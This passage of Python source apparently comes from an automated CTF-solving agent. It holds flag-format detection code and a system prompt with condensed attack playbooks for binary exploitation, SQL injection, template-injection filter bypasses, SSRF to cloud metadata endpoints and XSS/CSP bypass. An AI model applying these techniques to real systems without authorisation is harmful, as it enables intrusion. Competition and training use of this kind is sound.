    deadline = time.time() + branch_iters * 45  # rough timeout
    while not stop_event.is_set() and time.time() < deadline:
        if all(not t.is_alive() for t in threads): break
        time.sleep(2)

    stop_event.set()
    for t in threads: t.join(timeout=5)

    if result_queue:
        branch_id, hyp, flag = result_queue[0]
        log("ok", f"[PARALLEL] Branch {branch_id} won: {flag}", "white")
        return hyp, flag
    return None
FLAG_PATTERNS = [
    r"FLAG:\s*([^\n\r`]+)",
    r"picoCTF\{[^}]+\}",r"flag\{[^}]+\}",r"CTF\{[^}]+\}",
    r"DUCTF\{[^}]+\}",r"HTB\{[^}]+\}",r"thm\{[^}]+\}",
    r"corctf\{[^}]+\}",r"uiuctf\{[^}]+\}",r"hsctf\{[^}]+\}",
    r"wctf\{[^}]+\}",r"lactf\{[^}]+\}",r"actf\{[^}]+\}",
    r"[A-Za-z0-9_]{2,10}\{[A-Za-z0-9_!@#$%^&*()\-+=.<>?/\\,;:'\"\[\] ]{4,80}\}",
]

# ─── CTF Flag Format Intelligence ─────────────────────────────────────────────
# Comprehensive known-CTF → flag format database
_CTF_FORMAT_DB = {
    # Major recurring competitions (lowercase keys for matching)
    "picoctf":      {"prefix": "picoCTF",  "pattern": r"picoCTF\{[^}]+\}",      "example": "picoCTF{s0me_fl4g}"},
    "hackthebox":   {"prefix": "HTB",      "pattern": r"HTB\{[^}]+\}",           "example": "HTB{s0me_fl4g}"},
    "htb":          {"prefix": "HTB",      "pattern": r"HTB\{[^}]+\}",           "example": "HTB{s0me_fl4g}"},
    "tryhackme":    {"prefix": "THM",      "pattern": r"THM\{[^}]+\}",           "example": "THM{s0me_fl4g}"},
    "thm":          {"prefix": "THM",      "pattern": r"THM\{[^}]+\}",           "example": "THM{s0me_fl4g}"},
    "ductf":        {"prefix": "DUCTF",    "pattern": r"DUCTF\{[^}]+\}",         "example": "DUCTF{s0me_fl4g}"},
    "downunderctf": {"prefix": "DUCTF",    "pattern": r"DUCTF\{[^}]+\}",         "example": "DUCTF{s0me_fl4g}"},
    "corctf":       {"prefix": "corctf",   "pattern": r"corctf\{[^}]+\}",        "example": "corctf{s0me_fl4g}"},
    "uiuctf":       {"prefix": "uiuctf",   "pattern": r"uiuctf\{[^}]+\}",        "example": "uiuctf{s0me_fl4g}"},
    "hsctf":        {"prefix": "hsctf",    "pattern": r"hsctf\{[^}]+\}",         "example": "hsctf{s0me_fl4g}"},
    "lactf":        {"prefix": "lactf",    "pattern": r"lactf\{[^}]+\}",         "example": "lactf{s0me_fl4g}"},
    "actf":         {"prefix": "actf",     "pattern": r"actf\{[^}]+\}",          "example": "actf{s0me_fl4g}"},
    "wctf":         {"prefix": "wctf",     "pattern": r"wctf\{[^}]+\}",          "example": "wctf{s0me_fl4g}"},
    "nahamcon":     {"prefix": "flag",     "pattern": r"flag\{[^}]+\}",          "example": "flag{s0me_fl4g}"},
    "angstrom":     {"prefix": "actf",     "pattern": r"actf\{[^}]+\}",          "example": "actf{s0me_fl4g}"},
    "cyberapocalypse": {"prefix": "HTB",   "pattern": r"HTB\{[^}]+\}",           "example": "HTB{s0me_fl4g}"},
    "metactf":      {"prefix": "MetaCTF",  "pattern": r"MetaCTF\{[^}]+\}",       "example": "MetaCTF{s0me_fl4g}"},
    "buckeye":      {"prefix": "buckeye",  "pattern": r"buckeye\{[^}]+\}",       "example": "buckeye{s0me_fl4g}"},
    "sekaictf":     {"prefix": "SEKAI",    "pattern": r"SEKAI\{[^}]+\}",         "example": "SEKAI{s0me_fl4g}"},
    "googlectf":    {"prefix": "CTF",      "pattern": r"CTF\{[^}]+\}",           "example": "CTF{s0me_fl4g}"},
    "defcon":       {"prefix": "OOO",      "pattern": r"OOO\{[^}]+\}",           "example": "OOO{s0me_fl4g}"},
    "ctflearn":     {"prefix": "ctflearn", "pattern": r"ctflearn\{[^}]+\}",      "example": "ctflearn{s0me_fl4g}"},
    "damctf":       {"prefix": "dam",      "pattern": r"dam\{[^}]+\}",           "example": "dam{s0me_fl4g}"},
    "patriotctf":   {"prefix": "PCTF",     "pattern": r"PCTF\{[^}]+\}",          "example": "PCTF{s0me_fl4g}"},
    "pbctf":        {"prefix": "pbctf",    "pattern": r"pbctf\{[^}]+\}",         "example": "pbctf{s0me_fl4g}"},
    "redpwnctf":    {"prefix": "flag",     "pattern": r"flag\{[^}]+\}",          "example": "flag{s0me_fl4g}"},
    "dctf":         {"prefix": "CTF",      "pattern": r"CTF\{[^}]+\}",           "example": "CTF{s0me_fl4g}"},
    "inctf":        {"prefix": "inctf",    "pattern": r"inctf\{[^}]+\}",         "example": "inctf{s0me_fl4g}"},
    "imaginaryctf": {"prefix": "ictf",     "pattern": r"ictf\{[^}]+\}",          "example": "ictf{s0me_fl4g}"},
    "tjctf":        {"prefix": "tjctf",    "pattern": r"tjctf\{[^}]+\}",         "example": "tjctf{s0me_fl4g}"},
    "ctf4b":        {"prefix": "ctf4b",    "pattern": r"ctf4b\{[^}]+\}",         "example": "ctf4b{s0me_fl4g}"},
    "csaw":         {"prefix": "flag",     "pattern": r"flag\{[^}]+\}",          "example": "flag{s0me_fl4g}"},
    "hitcon":       {"prefix": "hitcon",   "pattern": r"hitcon\{[^}]+\}",        "example": "hitcon{s0me_fl4g}"},
    "plaidctf":     {"prefix": "PCTF",     "pattern": r"PCTF\{[^}]+\}",          "example": "PCTF{s0me_fl4g}"},
    "rwctf":        {"prefix": "rwctf",    "pattern": r"rwctf\{[^}]+\}",         "example": "rwctf{s0me_fl4g}"},
    "nullcon":      {"prefix": "flag",     "pattern": r"flag\{[^}]+\}",          "example": "flag{s0me_fl4g}"},
    "nitectf":      {"prefix": "nite",     "pattern": r"nite\{[^}]+\}",          "example": "nite{s0me_fl4g}"},
    "flag": {"prefix": "flag", "pattern": r"flag\{[^}]+\}", "example": "flag{s0me_fl4g}"},
}

# Runtime format cache: ctf_name → detected format info
_session_formats: dict = {}

def _normalize_ctf_key(name: str) -> str:
    """Normalize a CTF name for database lookup."""
    n = name.lower().strip()
    n = re.sub(r'[\s\-_]+', '', n)       # remove spaces/hyphens/underscores
    n = re.sub(r'\d{4}$', '', n)          # strip trailing year e.g. "picoctf2025" → "picoctf"
    n = re.sub(r'[^a-z]', '', n)          # letters only
    return n

def _scan_description_for_format(description: str) -> dict | None:
    """
    Scan challenge description for explicit flag format hints.
    Looks for patterns like:
      - "The flag is in the format PREFIX{...}"
      - "flag format: PREFIX{...}"
      - "submit as PREFIX{...}"
      - "wrap your answer in PREFIX{}"
      - Any PREFIX{example_flag} literal in the description
    """
    # Pattern 1: Explicit format statements
    explicit_pats = [
        r'flag\s+(?:is\s+in\s+the\s+)?format[:\s]+([A-Za-z0-9_]{2,12})\{',
        r'format[:\s]+([A-Za-z0-9_]{2,12})\{',
        r'submit\s+(?:as|in|the\s+flag\s+as)[:\s]+([A-Za-z0-9_]{2,12})\{',
        r'wrap\s+(?:your\s+answer\s+in|in)[:\s]+([A-Za-z0-9_]{2,12})\{',
        r'answer\s+(?:as|in)[:\s]+([A-Za-z0-9_]{2,12})\{',
        r'The\s+flag\s+format\s+is\s+([A-Za-z0-9_]{2,12})\{',
    ]
    for pat in explicit_pats:
        m = re.search(pat, description, re.IGNORECASE)
        if m:
            prefix = m.group(1)
            return {
                "prefix": prefix,
                "pattern": rf"{re.escape(prefix)}\{{[^}}]+\}}",
                "example": f"{prefix}{{s0me_fl4g}}",
                "source": "description_explicit",
                "confidence": "high"
            }

    # Pattern 2: Find any PREFIX{content} literal that looks like a flag example
    flag_literal = re.search(
        r'\b([A-Za-z][A-Za-z0-9_]{1,10})\{([A-Za-z0-9_!@#$%^&*()\-+=.<>?/\\, ]{4,60})\}',
        description
    )
    if flag_literal:
        prefix = flag_literal.group(1)
        # Filter out common false positives (code snippets, html, etc.)
        blacklist = {'http', 'https', 'function', 'class', 'struct', 'dict', 'list', 'set',
                     'import', 'return', 'print', 'main', 'void', 'int', 'char', 'bool',
                     'string', 'array', 'object', 'error', 'while', 'for', 'if', 'else'}
        if prefix.lower() not in blacklist and len(prefix) <= 12:
            return {
                "prefix": prefix,
                "pattern": rf"{re.escape(prefix)}\{{[^}}]+\}}",
                "example": f"{prefix}{{{flag_literal.group(2)}}}",
                "source": "description_literal",
                "confidence": "medium"
            }
    return None

def tool_detect_flag_format(ctf_name: str = "", description: str = "",
                             platform_type: str = "", hint: str = "") -> str:
    """
    Automatically detect the flag format for a CTF challenge.

    Detection pipeline (highest to lowest confidence):
    1. Session cache (previously confirmed format for this CTF)
    2. Explicit user hint
    3. Description scan for literal format statements
    4. Known CTF database lookup (by name)
    5. Platform-type inference
    6. Generic fallback

    Returns JSON with: prefix, pattern, example, confidence, source
    """
    global _session_formats

    # 1. Session cache
    ck = _normalize_ctf_key(ctf_name)
    if ck and ck in _session_formats:
        cached = _session_formats[ck].copy()
        cached["source"] = "session_cache"
        cached["confidence"] = "confirmed"
        result = json.dumps(cached, ensure_ascii=False)
        log("sys", f"[FMT] Using cached format for '{ctf_name}': {cached['prefix']}{{...}}", "dim")
        emit("flag_format", **cached, ctf=ctf_name)
        return result

    detected = None

    # 2. Explicit hint
    if hint:
        m = re.search(r'([A-Za-z0-9_]{2,12})\{', hint)
        if m:
            prefix = m.group(1)
            detected = {
                "prefix": prefix,
                "pattern": rf"{re.escape(prefix)}\{{[^}}]+\}}",
                "example": f"{prefix}{{s0me_fl4g}}",
                "source": "user_hint",
                "confidence": "high"
            }

    # 3. Description scan
    if not detected and description:
        desc_result = _scan_description_for_format(description)
        if desc_result:
            detected = desc_result

    # 4. Known CTF database
    if not detected and ctf_name:
        # Try progressively shorter normalizations
        for key_fn in [_normalize_ctf_key, lambda n: re.sub(r'\d','',n.lower().strip())]:
            nk = key_fn(ctf_name)
            for db_key, db_val in _CTF_FORMAT_DB.items():
                if db_key in nk or nk in db_key:
                    detected = {**db_val, "source": "known_db", "confidence": "high"}
                    break
            if detected: break

    # 5. Platform inference
    if not detected and platform_type:
        platform_map = {
            "picoctf": _CTF_FORMAT_DB["picoctf"],
            "htb":     _CTF_FORMAT_DB["htb"],
            "ctfd":    {"prefix": "flag", "pattern": r"flag\{[^}]+\}", "example": "flag{s0me_fl4g}"},
        }
        pt = platform_type.lower()
        if pt in platform_map:
            detected = {**platform_map[pt], "source": "platform_inference", "confidence": "medium"}

    # 6. Generic fallback
    if not detected:
        detected = {
            "prefix": "UNKNOWN",
            "pattern": r"[A-Za-z0-9_]{2,12}\{[^}]{4,80}\}",
            "example": "PREFIX{s0me_fl4g}",
            "source": "generic_fallback",
            "confidence": "low"
        }

    # Cache and emit
    if ck and detected.get("confidence") in ("high", "medium", "confirmed"):
        _session_formats[ck] = detected.copy()

    log("sys", f"[FMT] Detected flag format: {detected['prefix']}{{...}} "
               f"(confidence={detected['confidence']}, source={detected['source']})", "")
    emit("flag_format", **detected, ctf=ctf_name)

    # Build a human-readable summary
    out_lines = [
        f"Flag Format Detection Result:",
        f"  Prefix:     {detected['prefix']}{{...}}",
        f"  Example:    {detected['example']}",
        f"  Regex:      {detected['pattern']}",
        f"  Confidence: {detected['confidence']}",
        f"  Source:     {detected['source']}",
        f"",
        f"Use this format when searching for the flag.",
        f"If you find a flag NOT matching this pattern, call detect_flag_format again with",
        f"the found prefix to update the session cache for subsequent challenges.",
    ]
    return "\n".join(out_lines)

def confirm_flag_format(ctf_name: str, confirmed_prefix: str, confirmed_flag: str):
    """
    Called internally when a real flag is extracted.
    Updates the session cache with the confirmed prefix so subsequent
    challenges in the same CTF use the right format automatically.
    """
    global _session_formats
    ck = _normalize_ctf_key(ctf_name)
    if not ck: return
    fmt = {
        "prefix": confirmed_prefix,
        "pattern": rf"{re.escape(confirmed_prefix)}\{{[^}}]+\}}",
        "example": confirmed_flag,
        "source": "confirmed_from_flag",
        "confidence": "confirmed"
    }
    _session_formats[ck] = fmt
    log("sys", f"[FMT] Format confirmed: {confirmed_prefix}{{...}} for '{ctf_name}'", "dim")
    emit("flag_format", **fmt, ctf=ctf_name)

def _infer_prefix_from_flag(flag: str) -> str | None:
    """Extract prefix from a found flag string like PREFIX{...}."""
    m = re.match(r'^([A-Za-z][A-Za-z0-9_]{1,11})\{', flag)
    return m.group(1) if m else None

def extract_flag(text: str, ctf_name: str = "") -> str | None:
    """
    Extract a flag from text.
    Uses session-cached format first for precision, then falls back
    to the generic pattern list.
    """
    # Build search patterns: session format first (most specific), then generic
    search_patterns = []

    # If we have a session-cached format for this CTF, put it first
    ck = _normalize_ctf_key(ctf_name) if ctf_name else ""
    if ck and ck in _session_formats:
        search_patterns.append(_session_formats[ck]["pattern"])

    # Generic patterns next
    search_patterns.extend(FLAG_PATTERNS)

    for pat in search_patterns:
        try:
            m = re.search(pat, text, re.IGNORECASE)
            if m:
                f = m.group(0)
                if f.upper().startswith("FLAG:"): f = f[5:].strip()
                # Sanity check
                if len(f) > 300 or f.count(" ") > 15: continue
                # Must contain { and }
                if "{" not in f or "}" not in f: continue
                return f.strip()
        except re.error:
            continue
    return None

# ─── System Prompt ────────────────────────────────────────────────────────────
def build_system_prompt(platform_type, ctf_name, base_dir, extra_config):
    env = ("Windows+WSL2" if IS_WINDOWS and USE_WSL
           else "Windows(no WSL—use Python tools)" if IS_WINDOWS else "Linux/Mac")
    hints = extra_config.get("hints", {})
    extra = extra_config.get("extraInstructions", "")
    depth = extra_config.get("analysisDepth", "thorough")
    plat = f"\nPlatform: {platform_type} — submit_flag when found." if platform_type and platform_type!="manual" else ""

    return f"""You are an elite CTF solver capable of solving insane-difficulty challenges across all categories. You approach challenges with the methodical depth of a top CTF competitor.

## Environment
OS: {env} | CTF: {ctf_name or "?"} | Base dir: {base_dir or "?"}{plat}

## Solving Philosophy
Depth: {depth}. Never guess. Never give up early. If one approach fails, pivot with reasoning.
You have access to the same tools a top CTF team uses. Use them all.

## Methodology (follow this every time)
1. **create_workspace** — always first
2. **Recon** — understand the challenge fully before attacking
3. **Hypothesis** — state explicitly what vulnerability you believe exists and why
4. **Execute** — run tools, gather data, build evidence
5. **Iterate** — each tool result informs the next step, build on findings
6. **Verify** — confirm the flag before submitting
7. **submit_flag** — submit to platform
8. **write_file** — save WRITEUP.md with full solution

## Category Playbooks

### Binary Exploitation (pwn)
- Start: checksec → file_type → functions → disassemble main
- Stack: find overflow with cyclic pattern → compute offset → check protections
- No PIE: ret2win, ret2libc with static gadgets
- PIE+ASLR: leak address via format string or puts → compute base → ROP
- Format string: find offset (%n$p) → write to GOT/stack → control flow
- Heap: identify allocator → tcache poisoning / fastbin dup / unsorted bin attack
- One-gadget: search with `one_gadget libc.so`
- Always check: stack canary bypass, seccomp filters, SIGROP
{f"- Custom hint: {hints.get('Binary Exploitation','')}" if hints.get('Binary Exploitation') else ""}

### Cryptography
- Start: identify cipher type (IC test, block size detection, key schedule hints)
- RSA: check n factorability (factordb), small e (eth root), Wiener (small d), common modulus, shared prime, LSB oracle
- If n is small: brute force or Pollard rho
- Symmetric: identify mode (ECB=repeating blocks, CBC=IV dependency), check padding oracle
- Custom cipher: trace key schedule, look for weak mixing, algebraic structure
- Hash: identify algorithm → length extension (hash_extender) → collision if MD5/SHA1
- PRNG: identify generator → Mersenne Twister needs 624 outputs → LCG crack with 3 consecutive
- ECC: check curve order, ECDSA nonce reuse (r values match), invalid curve, pohlig-hellman
- Lattice: LLL reduction via sage_math for knapsack, hidden number problem, short vector
{f"- Custom hint: {hints.get('Cryptography','')}" if hints.get('Cryptography') else ""}

### Web Exploitation
- Start: read source code if given → source_audit(full_audit) → docker_recon if docker files present
- ALWAYS check for JS source maps: js_analyze(fetch_sourcemap) on every .js file → may expose full unminified source
- Auth bypass: test default creds, SQL injection in login, JWT manipulation
- SQLi: error-based → union-based → blind boolean → time-based. Use all four.
- XSS: check all reflection points, test stored vs reflected, CSP bypass techniques
- CSP bypass: check for unsafe-inline, *.cdn.com wildcards, JSONP endpoints, base-uri missing
- No-JS XSS: CSS attribute selectors as oracle, meta refresh, link prefetch side-channels
- SSRF: internal metadata, cloud IMDS (169.254.169.254), redirect chains, protocol smuggling
- SSTI: detect engine from error messages → escalate to RCE (config.class.classloader)
  - Jinja2 filter bypass: use hex escapes \\x5f for _, base64-wrap commands, request["application"]["__globals__"]
  - notepad pattern: path traversal with \\ instead of / to plant template → trigger via error= param
- File upload: bypass extension checks (double ext, null byte, polyglot), check MIME validation
- Path traversal filters: encoding_bypass(path_traversal) for backslash, double-encode, null byte variants
- Race condition: concurrent_requests with many simultaneous hits
- Email challenges: mime_email for header injection, encoded-word encoding, UTF-7 XSS bypass
  - Python random.randrange boundary prediction: collect boundaries → rng_crack(python_random_from_randbits63)
  - Header injection bypass: space after colon avoids Python's \\n[^\\s]+: regex check
- Cache poisoning: unkeyed headers, vary header abuse, cache deception
- Prototype pollution: __proto__ in JSON/query string → property injection
- GraphQL: introspection → batch queries → aliasing → CSRF
- WebSockets: inspect upgrade, test same-origin, message injection
- XXE: always try with XML input, blind via DNS/HTTP OOB
- Deserialization: identify language/framework → find gadget chains
{f"- Custom hint: {hints.get('Web','')}" if hints.get('Web') else ""}

### Reverse Engineering & Custom Architectures
- Start: file_type → strings → checksec → functions → disassemble main
- WASM binaries: wasm_analyze(decompile) → wasm_analyze(exports_imports) → wasm_analyze(to_python)
  - Custom CPU in WASM (Pachinko pattern): wasm_analyze(analyze_bitops) → find read-only=inputs, write-only=outputs
  - Port mapping: look for bits that increment by instruction_width on clock → that's PC/addr output
  - Extract bitops as Python → custom_cpu_emulate to build simulator with BitView
  - Dump registers with load-instruction trick: save state → execute load to leak reg via addr port → restore
- Static: objdump → radare2 pdf → ghidra decompiler
- Dynamic: strace/ltrace → gdb with breakpoints → frida for hooking
- Anti-debug: ptrace checks → timing checks → checksum verification of code
- VM/Interpreter: identify opcodes → write disassembler → trace execution
- Z3: model arithmetic conditions as constraints → solve for input
- Symbolic execution: angr for path exploration (use execute_python with angr)
- Custom crypto in binary: trace key schedule → recover key → implement inverse

### Forensics
- Start: file_type + magic_bytes + entropy block analysis
- Images: metadata (EXIF GPS data, comments, thumbnails) → steg_lsb → steg_tools → zsteg → binwalk
- PNG: check all chunks (tEXt, zTXt, iTXt, IDAT) with pngcheck
- Audio: spectrogram (audacity/sox) → DTMF → LSB in wav samples
- PCAP: tshark protocol breakdown → follow TCP streams → extract HTTP objects → decrypt TLS if key given
- Archives: test common passwords, known-plaintext attack if any file is known
- Memory dumps: volatility3 imageinfo → pslist → filescan → dumpfiles → cmdline → malfind
- Disk images: mount → file system walk → deleted files (photorec/foremost) → partition table
- PDF/Office: pdftotext, oletools, macros, embedded objects
{f"- Custom hint: {hints.get('Forensics','')}" if hints.get('Forensics') else ""}

### Reverse Engineering
- Start: file_type → strings → checksec → functions → disassemble main
- Static: objdump → radare2 pdf → ghidra decompiler
- Dynamic: strace/ltrace → gdb with breakpoints → frida for hooking
- Anti-debug: ptrace checks → timing checks → checksum verification of code
- Obfuscation: trace execution, identify decryption routine, dump decrypted payload
- VM/Interpreter: identify opcodes → write disassembler → trace execution
- Z3: model arithmetic conditions as constraints → solve for input
- Symbolic execution: angr for path exploration (use execute_python with angr)
- Custom crypto in binary: trace key schedule → recover key → implement inverse

### OSINT
- Username → social media cross-reference
- Image → reverse image search → EXIF GPS → Google Maps
- Domain → whois → certificate transparency (crt.sh) → historical DNS
- Metadata → author names → file paths → version info

## Side-Channel / Advanced Techniques
- Cache oracle (Redis LRU): flood → trigger → probe survivors → LLR calibration → beam search reconstruction
- Timing oracle: concurrent_requests with timing_analysis → statistical significance test
- Padding oracle: test 256 values per byte position → decrypt block by block
- Bit-flip: CBC byte flipping to modify plaintext at target position
- Power analysis: correlate Hamming weight with key hypothesis
- CSS oracle (no-JS XSS): attribute selectors + custom properties → exfil via cache/DNS/fetch

## Tool Selection Guide
- Need ROP chain? → binary_analysis(rop_gadgets) + execute_python(pwntools)
- Need lattice/LLL? → sage_math
- Need constraint solving? → z3_solve
- Need many parallel requests? → concurrent_requests
- Need timing measurement? → concurrent_requests + statistical_analysis(timing_analysis)
- Need to reconstruct secret from noisy oracle? → statistical_analysis(log_likelihood_ratio + beam_search)
- Need raw binary interaction? → tcp_connect with interactive_script using pwntools
- Need to crack XOR key length? → crypto_attack(xor_key_length)
- Source code provided? → source_audit(full_audit) FIRST, then docker_recon if docker files present
- Minified JS? → js_analyze(fetch_sourcemap) to recover full source, then js_analyze(extract_endpoints)
- WASM binary? → wasm_analyze(decompile) → wasm_analyze(analyze_bitops) → custom_cpu_emulate
- Python random/boundary prediction? → rng_crack(python_random_from_randbits63)
- Email challenge? → mime_email for all MIME operations, encoding_bypass(header_inject) for bypass techniques
- Filter bypass needed? → encoding_bypass(all) to get all variants at once
- Docker files? → docker_recon to find LRU policies, secrets, exposed services

## Flag Format Intelligence
ALWAYS call **detect_flag_format** as your VERY FIRST tool call before any other action.
- It uses a 50+ CTF database, description scanning, and session caching to identify the exact flag format
- Once detected, use the returned pattern as your PRIMARY flag search target throughout the solve
- The session cache means: after the first challenge in a CTF, subsequent challenges auto-detect instantly
- If you find a flag with a different prefix than predicted, call detect_flag_format(hint="PREFIX") to update the cache

## Flag Formats
picoCTF{{...}}, CTF{{...}}, flag{{...}}, HTB{{...}}, DUCTF{{...}}, thm{{...}}, and competition-specific formats.
State flag as: FLAG: <exact_value>

{f"## Extra Instructions\\n{extra}" if extra else ""}

## Rules
- ALWAYS create_workspace first
- State your hypothesis explicitly before attacking
- Every tool result should inform your next step — chain discoveries
- If stuck after 3 attempts on one approach, pivot to a different attack vector
- Never stop until flag found or all reasonable vectors exhausted
- submit_flag then write WRITEUP.md"""

# ─── Writeup generator ───────────────────────────────────────────────────────
def generate_writeup(client, model, challenge, flag, solve_summary, workspace, extra_config):
    if not workspace: return
    try:
        log("sys","Generating writeup...","")
        detail = extra_config.get("writeupDetail","normal")
        style  = extra_config.get("writeupStyle","technical")
        wname  = extra_config.get("writeupName","WRITEUP.md")

        prompt = f"""Write a {"comprehensive, detailed" if detail=="detailed" else "concise"} CTF writeup in Markdown.
Style: {style}

Challenge: {challenge.get('name')} | CTF: {challenge.get('ctf_name','')}
Category: {challenge.get('category')} | Points: {challenge.get('points')} | Difficulty: {challenge.get('difficulty')}
Flag: {flag}

Description:
{challenge.get('description','')}

Solve process:
{solve_summary}

Include: challenge overview, vulnerability identification, exploitation steps with commands/code, flag.
Format as clean Markdown. Be technical and precise."""

        resp = client.messages.create(model=model,max_tokens=3000,
                                      messages=[{"role":"user","content":prompt}])
        writeup = resp.content[0].text if resp.content else ""
        if writeup:
            path = os.path.join(workspace, wname)
            tool_write_file(path, writeup)
            log("ok",f"Writeup: {path}","white")
    except Exception as e: log("warn",f"Writeup failed: {e}","")

# ─── Import mode ─────────────────────────────────────────────────────────────
def run_import(payload):
    pc=payload.get("platform",{}); base_dir=payload.get("base_dir",""); ctf_name=payload.get("ctf_name","CTF")
    if not base_dir:
        log("err","No base directory set","red"); emit("import_result",error="No base directory"); return
    log("sys",f"Connecting to {pc.get('type','?')}...","bright")
    try:
        sys.path.insert(0,os.path.dirname(os.path.abspath(__file__)))
        from platforms import import_challenges
        res=import_challenges(pc,base_dir,ctf_name)
        if res.get("error"): log("err",res["error"],"red"); emit("import_result",error=res["error"]); return
        log("ok",res.get("login_message","Connected"),"white")
        n=len(res.get("challenges",[])); log("sys",f"Fetched {n} challenges","bright")
        for err in res.get("errors",[]): log("warn",err,"")
        emit("import_result",challenges=res.get("challenges",[]),
             platform_token=res.get("platform_token"),ctf_name=ctf_name)
    except Exception as e:
        log("err",f"Import failed: {e}","red"); emit("import_result",error=str(e))

# ─── Solve mode ──────────────────────────────────────────────────────────────
def run_solve(payload):
    global _PLATFORM_CONFIG, _solve_start_time, _current_model_display
    _solve_start_time = time.time()

    challenge      = payload.get("challenge",{})
    api_key        = payload.get("api_key","")
    user_model     = payload.get("model","claude-sonnet-4-6")
    pc             = payload.get("platform",{})
    base_dir       = payload.get("base_dir","")
    ctf_name       = payload.get("ctf_name","")
    extra          = payload.get("extraConfig",{})

    _PLATFORM_CONFIG = {**pc,"challenge_id":challenge.get("platform_id","")}
    os.environ["ANTHROPIC_API_KEY"] = api_key  # make available to sub-agents

    if not api_key: log("err","No API key","red"); result("failed"); return
    try: import anthropic
    except ImportError: log("err","pip install anthropic","red"); result("failed"); return

    client = anthropic.Anthropic(api_key=api_key)

    name    = challenge.get("name","Unknown")
    cat     = challenge.get("category","Unknown")
    diff    = challenge.get("difficulty","medium")
    pts     = challenge.get("points",0)
    desc    = challenge.get("description","(no description)")
    files   = challenge.get("files","")
    inst    = challenge.get("instance","")
    ffmt    = challenge.get("flagFormat") or challenge.get("flag_format","")
    ws      = challenge.get("workspace","")

    # ── Score-guided iteration budget ────────────────────────────────────────
    budget_override = int(payload.get("max_iterations",0))
    if budget_override > 0:
        max_iterations = budget_override
    else:
        max_iterations = ITERATION_BUDGET.get(diff.lower(), 25)
    max_tokens = int(extra.get("maxTokens", 4096))

    # Enabled tools filter — include all new tools by default
    enabled = set(extra.get("enabledTools", list(TOOL_MAP.keys())))
    active_tools = [t for t in TOOLS if t["name"] in enabled]

    # ── Cross-challenge knowledge injection ──────────────────────────────────
    knowledge_ctx = _get_knowledge_injection(ctf_name)

    # ── Auto-detect flag format ───────────────────────────────────────────────
    auto_fmt = tool_detect_flag_format(ctf_name=ctf_name, description=desc,
                                        platform_type=pc.get("type",""), hint=ffmt or "")
    fmt_match = re.search(r"Prefix:\s+(.+)\n.*Example:\s+(.+)\n.*Confidence:\s+(\S+)", auto_fmt)
    fmt_inject = ""
    if fmt_match:
        fmt_inject = (f"\n## Auto-Detected Flag Format\n"
                      f"Prefix: {fmt_match.group(1).strip()} | "
                      f"Example: {fmt_match.group(2).strip()} | "
                      f"Confidence: {fmt_match.group(3).strip()}\n")

    # ── System prompt ─────────────────────────────────────────────────────────
    system = build_system_prompt(pc.get("type","manual"), ctf_name, base_dir, extra)
    if knowledge_ctx:
        system = knowledge_ctx + "\n\n" + system

    log("sys",f"{'WSL2' if IS_WINDOWS and USE_WSL else 'Win' if IS_WINDOWS else 'Linux'} | budget={max_iterations}iters | tools={len(active_tools)}","")
    log("sys",f"━━━ [{cat}] {name} ({diff}, {pts}pts) ━━━","bright")
    emit("solve_start", name=name, category=cat, difficulty=diff, points=pts,
         budget=max_iterations, tools=len(active_tools))

    # ── Build base user message ───────────────────────────────────────────────
    user_msg = f"""Solve this CTF challenge completely.

Challenge: {name}
Category:  {cat}
Difficulty:{diff}
Points:    {pts}
CTF:       {ctf_name or 'Unknown'}
"""
    if ffmt:     user_msg += f"Flag format: {ffmt}\n"
    if inst:     user_msg += f"Instance:   {inst}\n"
    if base_dir: user_msg += f"Base dir:   {base_dir}\n"
    if ws:       user_msg += f"Workspace:  {ws} (already created)\n"
    elif base_dir and ctf_name:
        user_msg += f"\nCall create_workspace(base_dir='{base_dir}', ctf_name='{ctf_name}', category='{cat}', challenge_name='{name}')\n"

    user_msg += f"\n## Description\n{desc}\n"
    if files: user_msg += f"\n## Challenge Files / Source / Data\n```\n{files[:8000]}\n```\n"
    if fmt_inject: user_msg += fmt_inject
    if knowledge_ctx: user_msg += f"\n{knowledge_ctx}\n"
    user_msg += "\n**METHODOLOGY**: pre_solve_recon → rank_hypotheses → parallel branches on top-2 hypotheses → solve → knowledge_store any shared findings → submit_flag → write WRITEUP.md"

    # ── Parallel branch solve for hard/insane ────────────────────────────────
    if diff in ("hard","insane") and extra.get("parallelBranches", True):
        log("sys","[PARALLEL] Hard challenge — attempting parallel branch solve first","bright")
        # Fast hypothesis generation via Haiku
        try:
            h_resp = client.messages.create(
                model=_MODEL_HAIKU, max_tokens=512,
                messages=[{"role":"user","content":
                    f"CTF challenge: [{cat}] {name}\n{desc[:1500]}\n\n"
                    f"Files: {files[:500]}\nInstance: {inst}\n\n"
                    f"List exactly 3 attack hypotheses as numbered lines. Be specific. No padding."}]
            )
            hyp_text = h_resp.content[0].text if h_resp.content else ""
            hypotheses = [l.strip().lstrip("123456789.-) ") for l in hyp_text.splitlines() if l.strip() and len(l.strip()) > 10][:3]
        except Exception as e:
            log("warn",f"[PARALLEL] Hypothesis generation failed: {e}","")
            hypotheses = []

        if len(hypotheses) >= 2:
            challenge_ctx = {"ctf_name":ctf_name,"category":cat,"name":name,"user_msg":user_msg}
            branch_iters  = min(8, max_iterations // 4)
            branch_result = run_parallel_branches(hypotheses, challenge_ctx, api_key,
                                                   active_tools, system, branch_iters, extra)
            if branch_result:
                winning_hyp, found_flag = branch_result
                log("ok",f"🚩 FLAG (parallel): {found_flag}","white")
                prefix = _infer_prefix_from_flag(found_flag)
                if prefix and ctf_name: confirm_flag_format(ctf_name, prefix, found_flag)
                elapsed = time.time() - _solve_start_time
                emit("solve_stats", elapsed=round(elapsed,1), iterations=f"parallel/{branch_iters}",
                     model="parallel-sonnet", method=winning_hyp[:60])
                generate_writeup(client, user_model, {**challenge,"ctf_name":ctf_name},
                                 found_flag, f"Parallel solve via: {winning_hyp}", ws, extra)
                result("solved", found_flag, workspace=ws)
                return
            log("sys","[PARALLEL] No branch found flag — continuing with full sequential solve","dim")

    # ── Sequential solve loop ────────────────────────────────────────────────
    messages   = [{"role":"user","content":user_msg}]
    found_flag = None
    final_ws   = ws
    solve_log  = []
    iteration  = 0
    fruitless  = 0   # iterations since last meaningful progress
    last_flag_check_iter = 0

    while iteration < max_iterations:
        iteration += 1

        # ── Multi-model routing ──────────────────────────────────────────────
        model, use_thinking, thinking_tokens = _select_model(
            cat, diff, iteration, max_iterations, user_model)
        _current_model_display = model.split("-")[1] if "-" in model else model
        emit("model_switch", model=model, iteration=iteration,
             thinking=use_thinking, thinking_tokens=thinking_tokens)

        elapsed = time.time() - _solve_start_time
        log("sys",
